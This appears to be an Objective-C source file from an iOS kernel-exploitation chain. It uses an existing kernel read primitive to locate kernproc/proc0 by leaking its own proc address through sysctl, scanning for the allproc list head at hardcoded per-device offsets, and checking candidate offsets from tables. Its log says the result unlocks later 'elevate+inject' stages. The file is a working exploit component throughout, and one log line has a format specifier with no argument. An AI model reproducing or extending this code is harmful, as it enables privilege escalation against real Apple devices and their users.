//
//  P094KernprocDerive.m
//  Lum1na
//
//  See header. Zero kernel writes. Log: Documents/p094_kernproc_log.txt.
//

#import "P094KernprocDerive.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabIntelOffsets.h"
#import "LabRuntimeOffsets.h"
#import "P007Board.h"
#import "P007KreadLane.h"
#import "Lum1naStructOffsets.h"

#import <fcntl.h>
#import <string.h>
#import <unistd.h>
#import <errno.h>
#import <sys/sysctl.h>
#import <stddef.h>
#if __has_include(<sys/user.h>)
#import <sys/user.h>
/* macOS tooling build: real headers available. Pin the KERN_PROC ABI we use. */
_Static_assert(offsetof(struct kinfo_proc, kp_eproc) == 296, "eproc offset ABI");
_Static_assert(offsetof(struct eproc, e_paddr) == 0, "e_paddr ABI");
_Static_assert(sizeof(struct kinfo_proc) == 648, "kinfo_proc ABI size");
#else
/* iOS: <sys/user.h> is NOT in the iphoneos SDK (CI gate red 2026-10-14).
   The KERN_PROC_PID payload is a fixed Darwin ABI: struct extern_proc
   (296 bytes) then struct eproc whose field 0 is e_paddr (the requesting
   proc's kernel VA). Constants verified against the real headers on
   macOS arm64; the runtime len check below fails honestly if it drifts. */
typedef struct { uint8_t opaque[296]; } P094_extern_proc_min;
typedef struct { void *e_paddr; } P094_eproc_head_min;
typedef struct { P094_extern_proc_min kp_proc; P094_eproc_head_min kp_eproc; } P094_kinfo_proc_min;
#endif

#define P094_BUILD @"p094-kernproc-v2-listhead"

/* XPACI-based unsign, ClearSwordCore/poc.c. Identity on arm64.
   Same local-prototype convention as P069 mach_vm_map. */
extern uint64_t cs2_unpac_ptr(uint64_t kptr);

#pragma mark - log helpers

static int g_p094_fd = -1;
static NSMutableString *g_p094_buf;

static void p094_flush_line(NSString *out) {
    if (g_p094_buf) [g_p094_buf appendString:out];
    if (g_p094_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_p094_fd, s, strlen(s));
            fcntl(g_p094_fd, F_FULLFSYNC); /* panic-surviving flush per line */
        }
    }
}

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![line hasSuffix:@"\n"]) line = [line stringByAppendingString:@"\n"];
    @synchronized ([P094KernprocDerive class]) { p094_flush_line(line); }
}

/* LabIntelTab family <-> LabOff tag match (SKU filter for Path 3). */
static BOOL p094_family_matches(const char *family, const char *tag) {
    if (!family || !tag) return NO;
    if (strstr(family, tag)) return YES;
    if (strcmp(tag, "A14_23F77") == 0 && (strstr(family, "T8101") || strstr(family, "12377"))) return YES;
    if (strcmp(tag, "A13_22G100") == 0 && (strstr(family, "T8030") || strstr(family, "11417"))) return YES;
    if (strcmp(tag, "A12X_23G71") == 0 && (strstr(family, "T8020") || strstr(family, "23G71"))) return YES;
    return NO;
}

#pragma mark - kernel sanity helpers (mirror of Lum1naElevate)

static BOOL p094_looks_zone(uint64_t v) {
    return v >= 0xFFFFFFE000000000ULL && v < 0xFFFFFFF000000000ULL;
}
static BOOL p094_looks_static(uint64_t v) {
    return v >= 0xFFFFFFF000000000ULL;
}
static BOOL p094_looks_kernel(uint64_t v) {
    return p094_looks_zone(v) || p094_looks_static(v);
}

/* Validate that kaddr (SLID) looks like struct proc with the given pid.
   Returns YES when pid matches AND proc_ro/ucred are in kernel ranges. */
static BOOL p094_proc_valid(uint64_t kaddr, int wantPid, const LabProcOffTab *po,
                            uint64_t slide, NSMutableString *detail) {
    if (!p094_looks_kernel(kaddr)) return NO;
    uint32_t pid = P007LaneKRead32(kaddr + po->proc_pid);
    if (wantPid >= 0 && (int)pid != wantPid) {
        if (detail) [detail appendFormat:@"pid %u != %d; ", pid, wantPid];
        return NO;
    }
    uint64_t proc_ro = cs2_unpac_ptr(P007LaneKRead64(kaddr + po->proc_proc_ro));
    if (!p094_looks_kernel(proc_ro)) {
        if (detail) [detail appendFormat:@"proc_ro 0x%llx bad; ", (unsigned long long)proc_ro];
        return NO;
    }
    uint64_t ucred = cs2_unpac_ptr(P007LaneKRead64(proc_ro + po->pro_ro_ucred));
    if (!p094_looks_kernel(ucred)) {
        if (detail) [detail appendFormat:@"ucred 0x%llx bad; ", (unsigned long long)ucred];
        return NO;
    }
    return YES;
}

/* FORWARD le_next walk from a known proc to pid 0.
   xnu proc_list_add is LIST_INSERT_HEAD(&allproc, p) verbatim (Ghidra
   fork-register decompile, A13 22G100 + T8101 23F77): the head's FIRST
   member is the NEWEST proc and proc0 (kernel_task, pid 0, a static
   kernel global whose le_next stays NULL) sits at the TAIL. Walking
   le_prev from self walks TOWARD the head — it can never reach pid 0
   (rig 2026-10-15: "all paths missed" root cause). Chain ends at
   proc0.le_next == NULL. */
static uint64_t p094_walk_to_kernproc(uint64_t startProc, const LabProcOffTab *po,
                                      NSMutableString *log) {
    uint64_t cur = startProc;
    for (int i = 0; i < 4096; i++) {
        uint32_t pid = P007LaneKRead32(cur + po->proc_pid);
        if (pid == 0) {
            if (p094_proc_valid(cur, -1, po, 0, nil)) return cur;
        }
        uint64_t next = cs2_unpac_ptr(P007LaneKRead64(cur + po->proc_list_next));
        if (next == 0 || next == cur) break;   /* NULL tail = proc0 passed */
        if (!p094_looks_kernel(next)) break;   /* mutation mid-walk: honest */
        cur = next;
    }
    return 0;
}

#pragma mark - tap

@implementation P094KernprocDerive

+ (NSString *)tap {
    @synchronized ([P094KernprocDerive class]) {
        g_p094_buf = [NSMutableString string];
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"p094_kernproc_log.txt"];
        g_p094_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_APPEND, 0644);

        P007Board *b = [P007Board shared];
        const LabOffTab *off = LabOff();
        const LabProcOffTab *po = LabProcOff();
        uint64_t slide = b.kslide;
        int mypid = (int)getpid();

        L(@"=== p094 session %@ BUILD %@ ===", LabLocalMilitaryNow() ?: @"?", P094_BUILD);
        L(@"kernproc derivation, READ-ONLY. Zero kernel writes. LabOff stays");
        L(@"the only VA table; this probe validates, never hardcodes.");
        L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");
        L(@"lane=%@ hasKread=%@ slide=0x%llx pid=%d",
          [NSString stringWithUTF8String:P007LaneName() ?: "none"],
          b.hasKread ? @"YES" : @"NO",
          (unsigned long long)slide, mypid);

        if (!P007LaneLive()) {
            L(@"[-] SKIP - no live kread lane (tap Full Chain / cs2core first).");
            L(@"[-] Honesty: nothing derived, board untouched.");
            goto finish;
        }
        if (!po) {
            L(@"[-] SKIP - no struct-offset row for this SKU.");
            goto finish;
        }
        if (!b.hasKread) {
            L(@"[-] SKIP - hasKread NO (board gate; occupancy/slide never pass).");
            goto finish;
        }
        L(@"[*] struct row: tag=%s pid@0x%x proc_ro@0x%x ucred@proc_ro+0x%x",
          po->tag, po->proc_pid, po->proc_proc_ro, po->pro_ro_ucred);

        /* ---------- Path 1: sysctl anchor (public API, no exploit) ---------- */
        L(@"[*] Path 1: sysctl KERN_PROC_PID anchor.");
        uint64_t selfProc = 0;
        {
            int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, mypid };
            uint8_t kp[648];
            memset(kp, 0, sizeof(kp));
            size_t len = sizeof(kp);
            if (sysctl(mib, 4, kp, &len, NULL, 0) != 0) {
                L(@"[-] sysctl failed (errno %d) - anchor unavailable.", errno);
            } else if (len != 648) {
                L(@"[-] kinfo_proc len %zu != 648 (ABI drift) - honest miss.", len);
            } else {
#if __has_include(<sys/user.h>)
                uint64_t eaddr = (uint64_t)((struct kinfo_proc *)kp)->kp_eproc.e_paddr;
#else
                uint64_t eaddr = (uint64_t)((P094_kinfo_proc_min *)kp)->kp_eproc.e_paddr;
#endif
                L(@"[*] e_paddr = 0x%llx (zone=%@ static=%@)",
                  (unsigned long long)eaddr,
                  p094_looks_zone(eaddr) ? @"YES" : @"no",
                  p094_looks_static(eaddr) ? @"YES" : @"no");
                if (p094_looks_zone(eaddr)) {
                    NSMutableString *d = [NSMutableString string];
                    if (p094_proc_valid(eaddr, mypid, po, slide, d)) {
                        selfProc = eaddr;
                        L(@"[+] self proc ANCHOR validated: 0x%llx (pid %d, ucred uid reads below in p095).",
                          (unsigned long long)selfProc, mypid);
                        [b recordCandidate:selfProc kind:@"kernproc-self" source:@"p094"];
                    } else {
                        L(@"[-] e_paddr present but invalid for this row: %@", d);
                        L(@"[-] (offsets row mismatch or e_paddr masked - honest miss)");
                    }
                } else if (eaddr == 0) {
                    L(@"[-] e_paddr = 0 (hardened/masked on this build) - honest miss.");
                }
            }
        }

        uint64_t kernprocSlid = 0;
        if (selfProc) {
            kernprocSlid = p094_walk_to_kernproc(selfProc, po, nil);
            if (kernprocSlid) {
                L(@"[+] KERNPROC PROVEN via sysctl walk: 0x%llx (unslid 0x%llx, walk from self)",
                  (unsigned long long)kernprocSlid,
                  (unsigned long long)(kernprocSlid - slide));
            } else {
                L(@"[-] forward walk from self did not reach pid 0 (honest miss).");
            }
        }

        /* ---------- Path 2: proven __DATA delta scan ---------- */
        /* Per-SKU deltas; each is our own Ghidra proof on that exact build.
           A13 22G100 (T8030 xnu-11417.140.69): delta 0x364FCB8, 8-byte
           LIST_HEAD — fork-register LIST_INSERT_HEAD verbatim 2026-10-15
           (le_prev of first == &head; pid+0x60). P090's 0x35CC000 was the
           __DATA segment base; the head is 8-byte, not the 16-byte queue
           shape the old scan tried (head16 could never match LIST_HEAD).
           A14 23F77 (T8101 xnu-12377.122.4): delta 0x38FC770, 8-byte head —
           proc_list_add decompile 2026-10-14 (le_prev of first == &head). */
        uint64_t scanDelta = 0;
        BOOL scanHead16 = NO;
        if (off && strcmp(off->tag, "A13_22G100") == 0) {
            scanDelta = 0x364FCB8ULL; scanHead16 = NO;
        } else if (off && strcmp(off->tag, "A14_23F77") == 0) {
            scanDelta = 0x38FC770ULL; scanHead16 = NO;
        }
        if (!kernprocSlid && scanDelta && P007LaneBuffered()) {
            const uint64_t kScanCap   = scanHead16 ? 0x200000ULL : 0x80000ULL;
            const uint64_t kChunk     = 0x10000ULL;
            L(@"[*] Path 2: allproc head scan, window kbase+0x%llx cap 0x%llx (%s, %@ head).",
              (unsigned long long)scanDelta, (unsigned long long)kScanCap, off->tag,
              scanHead16 ? @"16-byte queue" : @"8-byte SMR-era");
            uint64_t windowBase = b.kbase + scanDelta;
            /* Anchor ping: three direct reads settle window-vs-validation
               BEFORE the sweep (rig 2026-10-15: device panicked 28 s into
               the 2 MB sweep with no evidence line). Read-only. */
            {
                uint64_t afirst = cs2_unpac_ptr(P007LaneKRead64(windowBase));
                if (p094_looks_kernel(afirst) && afirst != windowBase) {
                    uint64_t aprev = cs2_unpac_ptr(P007LaneKRead64(afirst + po->proc_list_prev));
                    uint32_t apid  = P007LaneKRead32(afirst + po->proc_pid);
                    /* LIST_INSERT_HEAD: the head's first member is the NEWEST
                       proc, so pid != 0 here is EXPECTED — proc0 sits at the
                       tail. Head shape = first->le_prev == &head AND first is
                       a valid proc (ANY pid). The old apid==0 MATCH could
                       never fire on a correct anchor. */
                    BOOL headshape = (aprev == windowBase) &&
                                     p094_proc_valid(afirst, -1, po, slide, nil);
                    L(@"[*] anchor ping: first=0x%llx prevBack=0x%llx pid=%u %@",
                      (unsigned long long)afirst, (unsigned long long)aprev, apid,
                      headshape ? @"HEAD-SHAPE MATCH (first=newest; pid 0 at tail)"
                                : @"MISMATCH");
                    if (headshape && !kernprocSlid) {
                        uint64_t k0 = p094_walk_to_kernproc(afirst, po, nil);
                        if (k0) {
                            kernprocSlid = k0;
                            L(@"[+] KERNPROC PROVEN via anchor ping: head 0x%llx -> tail proc0 0x%llx (unslid 0x%llx)",
                              (unsigned long long)windowBase, (unsigned long long)k0,
                              (unsigned long long)(k0 - slide));
                            [b recordCandidate:windowBase - slide kind:@"allproc-proven" source:@"p094"];
                        } else {
                            L(@"[-] anchor head-shape OK but forward walk missed pid 0 (honest; sweep fallback).");
                        }
                    }
                } else {
                    L(@"[-] anchor ping: head->first 0x%llx not a kernel proc ptr -",
                      (unsigned long long)afirst);
                    L(@"[-] anchor or slide wrong; sweep continues as fallback.");
                }
            }
            uint8_t *chunk = malloc(kChunk);
            if (chunk) {
                for (uint64_t o = 0; o < kScanCap && !kernprocSlid; o += kChunk) {
                    size_t cl = kChunk;
                    if (windowBase + o + cl > windowBase + kScanCap) cl = (size_t)(kScanCap - o);
                    ssize_t rc = P007LaneKReadBuf(windowBase + o, chunk, cl);
                    if (rc != (ssize_t)cl) { L(@"[-] chunk read ended scan at +0x%llx.", (unsigned long long)o); break; }
                    for (uint64_t i = 0; i + 16 <= cl && !kernprocSlid; i += 8) {
                        uint64_t headVA = windowBase + o + i;
                        uint64_t first = 0;
                        if (scanHead16) {
                            uint64_t nxt, prv;
                            memcpy(&nxt, chunk + i, 8);
                            memcpy(&prv, chunk + i + 8, 8);
                            if (!p094_looks_kernel(nxt) || !p094_looks_kernel(prv)) continue;
                            if (nxt == prv || nxt == headVA) continue;
                            uint64_t prevBack = P007LaneKRead64(nxt + po->proc_list_prev);
                            if (prevBack != headVA) continue;
                            if (P007LaneKRead32(nxt + po->proc_pid) != 0) continue;
                            uint64_t lastNext = P007LaneKRead64(prv + po->proc_list_next);
                            if (lastNext != headVA) continue;
                            first = nxt;
                        } else {
                            /* darwin 25: head is one pointer; first member's
                               le_prev == &head (proc_list_add verbatim).
                               LIST_INSERT_HEAD: first is the NEWEST proc —
                               pid 0 is at the TAIL, so validate ANY pid at
                               first then forward-walk le_next to proc0. */
                            memcpy(&first, chunk + i, 8);
                            first = cs2_unpac_ptr(first);
                            if (!p094_looks_kernel(first) || first == headVA) continue;
                            uint64_t prevBack = cs2_unpac_ptr(P007LaneKRead64(first + po->proc_list_prev));
                            if (prevBack != headVA) continue;
                            if (!p094_proc_valid(first, -1, po, slide, nil)) continue;
                            uint64_t k0 = p094_walk_to_kernproc(first, po, nil);
                            if (k0) {
                                kernprocSlid = k0;
                                L(@"[+] KERNPROC PROVEN via allproc head 0x%llx: first 0x%llx -> tail proc0 0x%llx (unslid 0x%llx)",
                                  (unsigned long long)headVA, (unsigned long long)first,
                                  (unsigned long long)k0, (unsigned long long)(k0 - slide));
                                [b recordCandidate:headVA - slide kind:@"allproc-proven" source:@"p094"];
                            }
                            continue;
                        }
                        if (scanHead16 && p094_proc_valid(first, 0, po, slide, nil)) {
                            kernprocSlid = first;
                            L(@"[+] KERNPROC PROVEN via allproc head 0x%llx: first member 0x%llx (unslid 0x%llx)",
                              (unsigned long long)headVA, (unsigned long long)first,
                              (unsigned long long)(first - slide));
                            [b recordCandidate:headVA - slide kind:@"allproc-proven" source:@"p094"];
                        }
                    }
                }
                free(chunk);
            } else {
                L(@"[-] malloc chunk failed - scan skipped.");
            }
        } else if (!kernprocSlid && scanDelta) {
            L(@"[-] Path 2 gated: live lane has no buffered read (scan needs kreadbuf).");
        }

        /* ---------- Path 3: LEAD validation (LabIntelTab claims) ---------- */
        L(@"[*] Path 3: LEAD claim validation (LabIntelTab, slid by +0x%llx, SKU-filtered).",
          (unsigned long long)slide);
        int skippedSKU = 0;
        for (int i = 0; i < LabIntelCount; i++) {
            const LabIntelEntry *e = &LabIntelTab[i];
            BOOL isKp  = strcmp(e->name, "kernproc") == 0;
            BOOL isKv  = strcmp(e->name, "kernprocvar") == 0;
            BOOL isAp  = strcmp(e->name, "allproc") == 0;
            BOOL isZp  = strcmp(e->name, "zombproc") == 0;
            if (!isKp && !isKv && !isAp && !isZp) continue;
            /* SKU filter: a wrong-SKU VA slid by THIS slide is meaningless
               and can false-CONFIRM on aliasing garbage. Match the LabOff
               tag or its Ghidra family alias. */
            if (off && !p094_family_matches(e->family, off->tag)) { skippedSKU++; continue; }
            uint64_t kaddr = e->value + slide;
            NSMutableString *d = [NSMutableString string];
            BOOL ok = NO;
            if (isKp) {
                ok = p094_proc_valid(kaddr, 0, po, slide, d);
                if (ok && !kernprocSlid) {
                    kernprocSlid = kaddr;
                    L(@"[+] KERNPROC PROVEN via LEAD row (%s): 0x%llx (unslid 0x%llx)",
                      e->family, (unsigned long long)kaddr, (unsigned long long)e->value);
                }
            } else if (isKv) {
                /* kernproc = struct proc * VARIABLE; runtime value is &proc0.
                   Dereference once, then validate the pointed-to proc (pid 0). */
                uint64_t p0 = cs2_unpac_ptr(P007LaneKRead64(kaddr));
                if (p094_looks_kernel(p0)) {
                    ok = p094_proc_valid(p0, 0, po, slide, d);
                    if (ok && !kernprocSlid) {
                        kernprocSlid = p0;
                        L(@"[+] KERNPROC PROVEN via kernprocvar (%s): var 0x%llx -> proc0 0x%llx (unslid 0x%llx)",
                          e->family, (unsigned long long)kaddr, (unsigned long long)p0,
                          (unsigned long long)(p0 - slide));
                    }
                } else {
                    [d appendFormat:@"*var 0x%llx bad; ", (unsigned long long)p0];
                }
            } else {
                /* allproc / zombproc: head variable. LIST_INSERT_HEAD: the
                   first member is the NEWEST proc — head shape = first->le_prev
                   == &head AND a valid proc at ANY pid. proc0 (pid 0) is at
                   the TAIL: forward-walk le_next to derive kernproc. */
                uint64_t first = cs2_unpac_ptr(P007LaneKRead64(kaddr));
                if (p094_looks_kernel(first)) {
                    uint64_t prevBack = cs2_unpac_ptr(P007LaneKRead64(first + po->proc_list_prev));
                    ok = (prevBack == kaddr) && p094_proc_valid(first, -1, po, slide, nil);
                    if (!ok) [d appendFormat:@"head shape bad (prevBack=0x%llx); ", (unsigned long long)prevBack];
                    if (ok && !kernprocSlid && isAp) {
                        uint64_t k0 = p094_walk_to_kernproc(first, po, nil);
                        if (k0) {
                            kernprocSlid = k0;
                            L(@"[+] KERNPROC PROVEN via LEAD row (%s): head 0x%llx -> tail proc0 0x%llx (unslid 0x%llx)",
                              e->family, (unsigned long long)kaddr, (unsigned long long)k0,
                              (unsigned long long)(k0 - slide));
                        } else {
                            L(@"[-] head CONFIRMED but forward walk missed pid 0 - kernproc not derived.");
                        }
                    }
                } else {
                    [d appendFormat:@"head->first 0x%llx bad; ", (unsigned long long)first];
                }
            }
            NSMutableString *verdict = [NSMutableString stringWithString:ok ? @"CONFIRMED" : @"refuted ("];
            if (!ok) [verdict appendFormat:@"%@)", d];
            L(@"%@ LEAD %-8s [%s] val=0x%llx -> %@",
              ok ? @"[+]" : @"[-]", e->name, e->family,
              (unsigned long long)e->value, verdict);
        }

        if (skippedSKU) L(@"[*] Path 3: %d wrong-SKU rows skipped (honest filter).", skippedSKU);

        /* ---------- Board record + verdict ---------- */
        if (kernprocSlid) {
            uint64_t unslid = kernprocSlid - slide;
            [b recordCandidate:unslid kind:@"kernproc-proven" source:@"p094"];
            [b recordEvent:@"p094_kernproc" kind:@"fire"
                    detail:[NSString stringWithFormat:@"unslid=0x%llx (elevate unlocked; static VA, persists across boots)",
                            (unsigned long long)unslid]
                    source:@"p094"];
            L(@"[+] BOARD: kernproc-proven unslid 0x%llx recorded. Lum1naElevate no longer HOLDs.");
            L(@"[+] Beta 1 ladder: next taps = p095 (ucred ladder) then Full Chain (elevate+inject).");
        } else {
            [b recordEvent:@"p094_kernproc" kind:@"miss"
                    detail:@"all paths missed (sysctl masked, no proven delta, LEADs refuted)"
                    source:@"p094"];
            L(@"[-] VERDICT: kernproc underived on %s this boot. Honest HOLD stays.", po->tag);
            L(@"[-] Next intel: per-SKU __DATA delta from the Ghidra pass (P090 pattern).");
        }

finish:
        L(@"=== p094 end ===");
        NSString *ret = g_p094_buf ?: @"";
        if (g_p094_fd >= 0) { fcntl(g_p094_fd, F_FULLFSYNC); close(g_p094_fd); g_p094_fd = -1; }
        g_p094_buf = nil;
        return ret;
    }
}

@end